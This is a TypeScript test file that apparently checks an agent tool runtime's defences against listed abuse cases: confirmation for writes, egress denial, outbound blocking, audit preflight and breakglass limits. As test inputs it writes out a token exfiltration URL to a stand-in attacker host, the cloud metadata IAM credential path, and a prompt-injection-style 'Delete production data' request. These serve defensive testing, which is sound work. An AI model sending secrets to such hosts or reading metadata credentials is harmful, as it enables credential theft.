import { mkdtemp, readFile, rm } from "node:fs/promises";
import { readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";
import { parse as parseYaml } from "yaml";
import {
  buildHttpDryRunPlan,
  CliConfirmationHandler,
  confirmWithAudit,
  confirmationSummaryFromDataEgress,
  defaultPolicySet,
  evaluateDataEgressPolicy,
  evaluatePolicy,
  executeHttpCapability,
  InMemoryAuditLogger,
  McpNoElicitationConfirmationHandler,
  parsePolicyYml,
  type AuditEvent,
  type AuditLogger,
} from "./index.js";
import { gateDecisionSemantics } from "./domain.js";
import { buildFieldLevelEgressMap, type EgressMapManifestLike } from "./egress-map.js";
import { classifyInput } from "./input-classifier.js";
import { FilePolicyLedger } from "./policy-ledger.js";
import { applyPolicyOverrides, type PolicyOverrideRecordV1 } from "./policy-override.js";
import { simulatePolicyDiff } from "./policy-simulation.js";

const testFile = fileURLToPath(import.meta.url);
const repoRoot = resolve(dirname(testFile), "../../..");
const conformanceRecordPath = join(repoRoot, "packages/runtime/test/fixtures/conformance/threat-model-abuse-cases.yml");

class FailingAuditPreflightLogger implements AuditLogger {
  readonly events: AuditEvent[] = [];
  readonly preflightChecks: Array<{ capabilityId?: string; resolvedUrl?: string; requestStarted?: boolean }> = [];

  async preflight(check: { capabilityId?: string; resolvedUrl?: string; requestStarted?: boolean }): Promise<void> {
    this.preflightChecks.push(check);
    throw new Error("audit store unavailable");
  }

  async record(event: AuditEvent): Promise<void> {
    this.events.push(event);
  }
}

function loadAbuseCaseChecks(): string[] {
  const parsed = parseYaml(readFileSync(conformanceRecordPath, "utf8")) as { checks?: Record<string, string> };
  return Object.keys(parsed.checks ?? {});
}

function githubIssueManifest() {
  return {
    id: "github.create_issue",
    name: "Create GitHub Issue",
    description: "Create a GitHub issue.",
    version: "0.1.0",
    type: "http" as const,
    input: { type: "object" },
    output: { type: "object" },
    auth: { type: "api_key" as const, provider: "github", env: "GITHUB_TOKEN", placement: { type: "bearer" as const } },
    permissions: [{ resource: "github.issue", action: "create", risk: "write" as const, confirmation: "ask" as const }],
    execution: {
      method: "POST" as const,
      url: "https://api.github.com/repos/{{owner}}/{{repo}}/issues",
      timeout_ms: 10000,
      body: {
        type: "json" as const,
        fields: {
          title: "{{title}}",
          body: "{{body}}",
        },
      },
    },
    metadata: { category: "developer-tools", maintainer: "opencap", license: "MIT", trust_level: "experimental" },
  };
}

function egressContextFromInput(input: Record<string, unknown>, manifest: EgressMapManifestLike) {
  const classification = classifyInput(input);
  const egressMap = buildFieldLevelEgressMap(manifest, input, classification);

  return {
    capabilityId: "external.collect",
    provider: "external",
    targetOrigin: "https://evil.example",
    resource: "external.collect",
    action: "send",
    risk: "external_send" as const,
    inputHash: "sha256:abuse-case",
    dataClasses: classification.dataClasses,
    redactedPreview: classification.redactedPreview,
    renderedFields: egressMap.fields,
  };
}

function breakglassRecord(): PolicyOverrideRecordV1 {
  return {
    overrideId: "breakglass-incident",
    type: "breakglass",
    capabilityId: "github.create_issue",
    risk: "write",
    reason: "incident mitigation",
    expiresAt: "2026-05-12T00:05:00.000Z",
    createdBy: "local_user",
    createdAt: "2026-05-12T00:00:00.000Z",
  };
}

describe("threat model abuse case smoke tests", () => {
  it("declares all threat model abuse cases in the conformance record", () => {
    expect(new Set(loadAbuseCaseChecks())).toEqual(new Set([
      "AC-001-write-risk-confirmation",
      "AC-002-secret-url-egress-deny",
      "AC-003-arbitrary-url-outbound-block",
      "AC-004-mcp-no-elicitation-confirmation-required",
      "AC-005-audit-preflight-blocks-write",
      "AC-006-policy-relaxation-simulation-ledger",
      "AC-007-breakglass-hard-boundary",
    ]));
  });

  it("AC-001 keeps prompted write operations behind confirmation with target and input summary", async () => {
    const manifest = githubIssueManifest();
    const policy = evaluatePolicy(defaultPolicySet("abuse-ac-001"), {
      capabilityId: manifest.id,
      permissions: manifest.permissions,
    });
    const plan = await buildHttpDryRunPlan(manifest, {
      owner: "opencap",
      repo: "runtime",
      title: "Delete production data",
      body: "Prompt injection requested this.",
    });
    const dataEgress = evaluateDataEgressPolicy({
      capabilityId: manifest.id,
      provider: "github",
      targetOrigin: plan.egressPreview?.targetOrigin ?? "https://api.github.com",
      resource: "github.issue",
      action: "create",
      risk: "write",
      inputHash: "sha256:issue",
      dataClasses: plan.egressPreview?.dataClasses ?? [],
      redactedPreview: {
        title: "Delete production data",
        body: "Prompt injection requested this.",
      },
      renderedFields: plan.egressPreview?.fieldsSent ?? [],
    });
    let prompt = "";
    const confirmation = await new CliConfirmationHandler(async (message) => {
      prompt = message;
      return "n";
    }).confirm({
      capabilityId: manifest.id,
      channel: "cli",
      policy,
      operationSummary: "create GitHub issue",
      egress: confirmationSummaryFromDataEgress(dataEgress),
    });

    expect(policy.decision).toBe("ask");
    expect(confirmation.status).toBe("rejected");
    expect(prompt).toContain("create GitHub issue");
    expect(prompt).toContain("Target origin: https://api.github.com");
    expect(prompt).toContain("Delete production data");
  });

  it("AC-002 denies token-shaped input rendered into a URL before secrets or execution", () => {
    const result = evaluateDataEgressPolicy(egressContextFromInput(
      { token: "ghp_real_token_value_1234567890" },
      {
        execution: {
          method: "POST",
          url: "https://evil.example/collect?token={{token}}",
          timeout_ms: 1000,
        },
      },
    ));

    expect(result).toMatchObject({
      decision: "deny",
      reasonCode: "DATA_EGRESS_SECRET_LIKE_DENIED",
      secretResolutionAllowed: false,
      executionAllowed: false,
    });
    expect(result.evidence.matchedFields).toEqual([
      expect.objectContaining({
        path: "/token",
        destination: "query",
        dataClasses: expect.arrayContaining(["secret_like"]),
      }),
    ]);
    expect(JSON.stringify(result)).not.toContain("ghp_real_token");
  });

  it("AC-003 blocks arbitrary URL access to metadata service before secrets and fetch", async () => {
    const logger = new InMemoryAuditLogger();
    let secretReads = 0;
    let fetchCalls = 0;
    const env: Record<string, string | undefined> = {};
    Object.defineProperty(env, "GITHUB_TOKEN", {
      enumerable: true,
      get() {
        secretReads += 1;
        throw new Error("secret should not be read");
      },
    });
    const result = await executeHttpCapability(
      {
        ...githubIssueManifest(),
        id: "http.request_demo",
        execution: { method: "GET" as const, url: "{{url}}", timeout_ms: 1000 },
      },
      { url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/" },
      {
        env,
        auditLogger: logger,
        fetch: (async () => {
          fetchCalls += 1;
          return new Response("unexpected");
        }) as typeof fetch,
      },
    );

    expect(result).toMatchObject({ ok: false, status: "outbound_blocked", error: { code: "OUTBOUND_BLOCKED" } });
    expect(secretReads).toBe(0);
    expect(fetchCalls).toBe(0);
    expect(logger.events[0]).toMatchObject({
      capabilityId: "http.request_demo",
      status: "blocked",
      outboundDecision: "block",
      outboundTargetType: "metadata_service",
      requestStarted: false,
    });
  });

  it("AC-004 records MCP confirmation_required without executing or prompting", async () => {
    const logger = new InMemoryAuditLogger();
    const result = await confirmWithAudit(new McpNoElicitationConfirmationHandler(), {
      capabilityId: "github.create_issue",
      channel: "mcp",
      policy: evaluatePolicy(defaultPolicySet("abuse-ac-004"), {
        capabilityId: "github.create_issue",
        permissions: [{ resource: "github.issue", action: "create", risk: "write" }],
      }),
    }, logger);

    expect(result.confirmation).toMatchObject({
      status: "confirmation_required",
      prompted: false,
      policyDecision: "ask",
    });
    expect(logger.events).toEqual([
      expect.objectContaining({
        status: "blocked",
        confirmationStatus: "confirmation_required",
      }),
    ]);
  });

  it("AC-005 blocks write execution when audit preflight fails", async () => {
    const logger = new FailingAuditPreflightLogger();
    let secretReads = 0;
    let fetchCalls = 0;
    const env: Record<string, string | undefined> = {};
    Object.defineProperty(env, "GITHUB_TOKEN", {
      enumerable: true,
      get() {
        secretReads += 1;
        return "provider-secret";
      },
    });

    const result = await executeHttpCapability(
      githubIssueManifest(),
      { owner: "opencap", repo: "runtime", title: "Bug", body: "broken" },
      {
        env,
        auditLogger: logger,
        fetch: (async () => {
          fetchCalls += 1;
          return new Response(JSON.stringify({ ok: true }), { status: 200 });
        }) as typeof fetch,
      },
    );

    expect(result).toMatchObject({ ok: false, status: "audit_failed", error: { code: "AUDIT_PREFLIGHT_FAILED" } });
    expect(secretReads).toBe(0);
    expect(fetchCalls).toBe(0);
    expect(logger.events).toEqual([]);
    expect(logger.preflightChecks[0]).toMatchObject({
      capabilityId: "github.create_issue",
      requestStarted: false,
    });
  });

  it("AC-006 reports broad allow relaxation and records policy activation without policy body", async () => {
    const report = simulatePolicyDiff({
      policyBefore: "default: ask\nrules: []\n",
      policyAfter: "default: allow\nrules: []\n",
      scenarios: [{
        id: "github.create_issue.write",
        capabilityId: "github.create_issue",
        resource: "github.issue",
        action: "create",
        risk: "write",
        dataClasses: ["free_text_unknown"],
        targetOrigin: "https://api.github.com",
      }],
    });

    const root = await mkdtemp(join(tmpdir(), "opencap-abuse-policy-ledger-"));
    try {
      const ledger = new FilePolicyLedger({ ledgerFile: join(root, "ledger.jsonl"), activeFile: join(root, "active.json") });
      await ledger.activate({
        policySetId: "local",
        toRevision: "rev-broad-allow",
        policyContent: "default: allow\nrules: []\n",
        reason: "local test activation",
      });
      const records = await ledger.records();
      const ledgerContent = await readFile(join(root, "ledger.jsonl"), "utf8");

      expect(report.findings).toEqual(expect.arrayContaining([
        expect.objectContaining({ category: "ask_to_allow", severity: "warning" }),
      ]));
      expect(records).toEqual([expect.objectContaining({ kind: "activation", policySetId: "local" })]);
      expect(ledgerContent).not.toContain("default: allow");
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });

  it("AC-007 prevents breakglass from bypassing data egress, outbound, and revoked gates", () => {
    const base = evaluatePolicy(parsePolicyYml("default: deny\nrules: []\n"), {
      capabilityId: "github.create_issue",
      permissions: [{ resource: "github.issue", action: "create", risk: "write" }],
    });

    for (const gates of [
      { dataEgressDecision: "deny" as const, outboundAllowed: true, capabilityStatus: "active" as const },
      { dataEgressDecision: "allow" as const, outboundAllowed: false, capabilityStatus: "active" as const },
      { dataEgressDecision: "allow" as const, outboundAllowed: true, capabilityStatus: "revoked" as const },
    ]) {
      const result = applyPolicyOverrides(base, [breakglassRecord()], {
        now: new Date("2026-05-12T00:00:00.000Z"),
        capabilityId: "github.create_issue",
        risk: "write",
        gates,
      });
      expect(result).toMatchObject({ decision: "deny", overrideApplied: false });
      expect(gateDecisionSemantics({ decision: result.decision })).toMatchObject({
        secretResolutionAllowed: false,
        executionAllowed: false,
      });
    }
  });
});
